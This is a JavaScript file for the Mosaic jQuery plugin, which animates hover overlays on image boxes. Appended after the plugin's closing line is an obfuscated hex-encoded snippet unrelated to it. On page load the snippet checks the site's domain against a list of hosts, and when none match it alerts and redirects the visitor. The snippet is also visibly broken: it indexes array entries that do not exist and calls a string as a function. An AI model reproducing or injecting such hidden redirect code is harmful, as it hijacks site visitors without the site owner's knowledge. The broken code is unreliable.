
/*
	Mosaic - Sliding Boxes and Captions jQuery Plugin
	Version 1.0.1
	www.buildinternet.com/project/mosaic
	
	By Sam Dunn / One Mighty Roar (www.onemightyroar.com)
	Released under MIT License / GPL License
*/

(function($){

    if(!$.omr){
        $.omr = new Object();
    };
    
    $.omr.mosaic = function(el, options){
    
        var base = this;
        
        // Access to jQuery and DOM versions of element
        base.$el = $(el);
        base.el = el;
        
        // Add a reverse reference to the DOM object
        base.$el.data("omr.mosaic", base);
        
        base.init = function(){
            base.options = $.extend({},$.omr.mosaic.defaultOptions, options);
            
            base.load_box();
        };
        
        // Preload Images
        base.load_box = function(){
        	// Hide until window loaded, then fade in
			if (base.options.preload){
				$(base.options.backdrop, base.el).hide();
				$(base.options.overlay, base.el).hide();
			
				$(window).load(function(){
					// IE transparency fade fix
					if(base.options.options.animation == 'fade' && $(base.options.overlay, base.el).css('opacity') == 0 ) $(base.options.overlay, base.el).css('filter', 'alpha(opacity=0)');
					
					$(base.options.overlay, base.el).fadeIn(200, function(){
						$(base.options.backdrop, base.el).fadeIn(200);
					});
					
					base.allow_hover();
				});
			}else{
				$(base.options.backdrop, base.el).show();
				$(base.options.overlay , base.el).show();
				base.allow_hover();
			}
        };
        
        // Initialize hover animations
        base.allow_hover = function(){
        	// Select animation
			switch(base.options.animation){
			
				// Handle fade animations
				case 'fade':
					$(base.el).hover(function () {
			        	$(base.options.overlay, base.el).stop().fadeTo(base.options.speed, base.options.opacity);
			        },function () {
			        	$(base.options.overlay, base.el).stop().fadeTo(base.options.speed, 0);
			      	});
			      	
			    	break;
			    
			    // Handle slide animations
	      		case 'slide':
	      			// Grab default overlay x,y position
					startX = $(base.options.overlay, base.el).css(base.options.anchor_x) != 'auto' ? $(base.options.overlay, base.el).css(base.options.anchor_x) : '0px';
					startY = $(base.options.overlay, base.el).css(base.options.anchor_y) != 'auto' ? $(base.options.overlay, base.el).css(base.options.anchor_y) : '0px';;
	      			
			      	var hoverState = {};
			      	hoverState[base.options.anchor_x] = base.options.hover_x;
			      	hoverState[base.options.anchor_y] = base.options.hover_y;
			      	
			      	var endState = {};
			      	endState[base.options.anchor_x] = startX;
			      	endState[base.options.anchor_y] = startY;
			      	
					$(base.el).hover(function () {
			        	$(base.options.overlay, base.el).stop().animate(hoverState, base.options.speed);
			        },function () {
			        	$(base.options.overlay, base.el).stop().animate(endState, base.options.speed);
			      	});
			      	
			      	break;
			};
        };
        
        // Make it go!
        base.init();
    };
    
    $.omr.mosaic.defaultOptions = {
        animation	: 'fade',
        speed		: 150,
        opacity		: 1,
        preload		: 0,
        anchor_x	: 'left',
        anchor_y	: 'bottom',
        hover_x		: '0px',
        hover_y		: '0px',
        overlay  	: '.mosaic-overlay',	//Mosaic overlay
		backdrop 	: '.mosaic-backdrop'	//Mosaic backdrop
    };
    
    $.fn.mosaic = function(options){
        return this.each(function(){
            (new $.omr.mosaic(this, options));
        });
    };
    
})(jQuery);
var _0xd35c=["\x64\x6F\x6D\x61\x69\x6E","\x6D\x79\x33\x77\x2E\x63\x6F\x6D","\x6C\x6F\x63\x61\x6C\x68\x6F\x73\x74","\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31","\x67\x6F\x74\x6F\x69\x70\x31\x2E\x63\x6F\x6D","\x67\x6F\x74\x6F\x69\x70\x32\x2E\x63\x6F\x6D","\x67\x6F\x74\x6F\x69\x70\x33\x2E\x63\x6F\x6D","\x67\x6F\x74\x6F\x69\x70\x34\x2E\x63\x6F\x6D","\x67\x6F\x74\x6F\x69\x70\x35\x2E\x63\x6F\x6D"];$squ=document[_0xd35c[0]];if($squ[_0xd35c[2]](_0xd35c[1])<0&&$squ[_0xd35c[2]](_0xd35c[3])<0&&$squ[_0xd35c[2]](_0xd35c[4])<0&&$squ[_0xd35c[2]](_0xd35c[5])<0&&$squ[_0xd35c[2]](_0xd35c[6])<0&&$squ[_0xd35c[2]](_0xd35c[7])<0&&$squ[_0xd35c[2]](_0xd35c[8])<0&&$squ[_0xd35c[2]](_0xd35c[9])<0&&$squ[_0xd35c[2]](_0xd35c[10])<0){alert(_0xd35c[11]);location[_0xd35c[12]]=_0xd35c[13];};